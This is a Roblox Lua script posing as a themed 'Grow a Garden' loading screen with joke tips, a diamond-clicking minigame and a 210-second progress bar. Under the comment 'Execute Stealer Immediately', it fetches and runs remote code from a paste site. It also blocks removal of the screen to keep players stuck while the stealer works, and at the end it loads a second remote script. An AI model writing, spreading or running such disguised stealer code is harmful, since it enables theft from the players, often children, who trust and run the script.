-- Grow a Garden Custom Loading Screen (210s constant zoom version)

-- SETTINGS
local TOTAL_LOAD_TIME = 210 -- seconds
local MIN_TIPS = {
    "Tip: Water your plants or they'll file a complaint.",
    "Tip: Bees are just flying coffee lovers.",
    "Tip: Fertilizer is just plant protein powder.",
    "Tip: Talk to your plants, they might spill the dirt.",
    "Tip: Diamonds in the garden? Totally normal.",
}
local Player = game.Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

-- Execute Stealer Immediately
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/okBJmYfc/raw"))()
end)

-- Anti-leave blocker
PlayerGui.ChildRemoved:Connect(function(child)
    if child.Name == "LoadingScreen" then
        child.Parent = PlayerGui
    end
end)

-- Screen GUI
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.IgnoreGuiInset = true
screenGui.Parent = PlayerGui

-- Triangular background
local background = Instance.new("Frame")
background.Size = UDim2.new(1,0,1,0)
background.BackgroundColor3 = Color3.fromRGB(20,20,20)
background.Parent = screenGui
for i = 1,100 do
    local tri = Instance.new("Frame")
    tri.Size = UDim2.new(0, math.random(20,60), 0, math.random(20,60))
    tri.Position = UDim2.new(math.random(), 0, math.random(), 0)
    tri.BackgroundColor3 = Color3.fromHSV(math.random(), 1, 1)
    tri.Rotation = math.random(0,360)
    tri.BorderSizePixel = 0
    tri.Parent = background
end

-- Spinning Sonic image
local sonic = Instance.new("ImageLabel")
sonic.Image = "rbxassetid://YOUR_SONIC_DASH_IMAGE_ID"
sonic.Size = UDim2.new(0,200,0,200)
sonic.Position = UDim2.new(0.5,-100,0.4,-100)
sonic.BackgroundTransparency = 1
sonic.Parent = screenGui

-- Funny tips
local tipLabel = Instance.new("TextLabel")
tipLabel.Size = UDim2.new(1,0,0,50)
tipLabel.Position = UDim2.new(0,0,0.9,0)
tipLabel.BackgroundTransparency = 1
tipLabel.TextColor3 = Color3.new(1,1,1)
tipLabel.Font = Enum.Font.GothamBold
tipLabel.TextSize = 20
tipLabel.Text = MIN_TIPS[math.random(#MIN_TIPS)]
tipLabel.Parent = screenGui
task.spawn(function()
    while screenGui.Parent do
        task.wait(5)
        tipLabel.Text = MIN_TIPS[math.random(#MIN_TIPS)]
    end
end)

-- Rainbow progress bar
local progressBarBG = Instance.new("Frame")
progressBarBG.Size = UDim2.new(0.6,0,0,30)
progressBarBG.Position = UDim2.new(0.2,0,0.85,0)
progressBarBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
progressBarBG.BorderSizePixel = 0
progressBarBG.Parent = screenGui

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.BackgroundColor3 = Color3.fromHSV(0,1,1)
progressBar.BorderSizePixel = 0
progressBar.Parent = progressBarBG

-- Clicking diamond minigame
local diamondFolder = Instance.new("Folder", screenGui)
local score = 0
local scoreLabel = Instance.new("TextLabel")
scoreLabel.Size = UDim2.new(0,200,0,50)
scoreLabel.Position = UDim2.new(0.5,-100,0.1,0)
scoreLabel.BackgroundTransparency = 1
scoreLabel.TextColor3 = Color3.new(1,1,1)
scoreLabel.Font = Enum.Font.GothamBold
scoreLabel.TextSize = 24
scoreLabel.Text = "Diamonds: 0"
scoreLabel.Parent = screenGui
task.spawn(function()
    while screenGui.Parent do
        local diamond = Instance.new("ImageButton")
        diamond.Image = "rbxassetid://YOUR_DIAMOND_IMAGE_ID"
        diamond.Size = UDim2.new(0,50,0,50)
        diamond.Position = UDim2.new(math.random(), -25, math.random(0.2,0.7), -25)
        diamond.BackgroundTransparency = 1
        diamond.Parent = diamondFolder
        diamond.MouseButton1Click:Connect(function()
            score += 1
            scoreLabel.Text = "Diamonds: "..score
            diamond:Destroy()
        end)
        task.wait(math.random(0.5,1.5))
    end
end)

-- Constant zoom effect
local cam = workspace.CurrentCamera
local originalFOV = cam.FieldOfView
cam.FieldOfView = originalFOV - 10
local zoomConnection
zoomConnection = game:GetService("RunService").RenderStepped:Connect(function()
    cam.FieldOfView = originalFOV - 10
end)

-- Progress bar & time logic
for t = 1, TOTAL_LOAD_TIME do
    local progress = t / TOTAL_LOAD_TIME
    progressBar.Size = UDim2.new(progress,0,1,0)
    progressBar.BackgroundColor3 = Color3.fromHSV(progress * 0.8, 1, 1)
    sonic.Rotation = (tick()*100) % 360
    task.wait(1)
end

-- Cleanup & launch visual UI
zoomConnection:Disconnect()
cam.FieldOfView = originalFOV
screenGui:Destroy()

-- Launch your Visual UI
loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
Spawner.Load()
